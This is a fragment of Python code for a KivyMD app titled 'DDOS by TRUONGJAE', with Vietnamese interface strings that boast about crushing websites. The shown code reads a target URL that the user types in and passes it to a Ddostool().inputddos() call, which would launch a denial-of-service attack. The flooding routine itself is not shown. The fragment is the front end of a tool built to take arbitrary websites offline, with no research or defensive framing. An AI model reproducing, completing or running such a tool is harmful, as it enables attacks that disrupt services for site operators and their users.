...
ScreenManager:
    Main:
<Main>:
    name : 'DDOS by TRUONGJAE'
    BoxLayout:
        orientation: "vertical"
        MDToolbar:
            title: 'DDOS không lối thoát by TRUONGJAE'
...
sm = ScreenManager()
sm.add_widget(Main(name='DDOS by TRUONGJAE'))

class MainApp(MDApp):
    def build(self):
        self.help_string = Builder.load_string(Builder_string)
        self.title = 'DDOS by TRUONGJAE'
        return self.help_string
    def ddos(self):
        global tenwebsite
        linkurl = str(self.help_string.get_screen('DDOS by TRUONGJAE').ids.linkurl.text)
        self.help_string.get_screen('DDOS by TRUONGJAE').ids.result.text = "Trang web " +str(linkurl)+" đang bị chịch!!!"
        tenwebsite = linkurl
        Ddostool().inputddos()
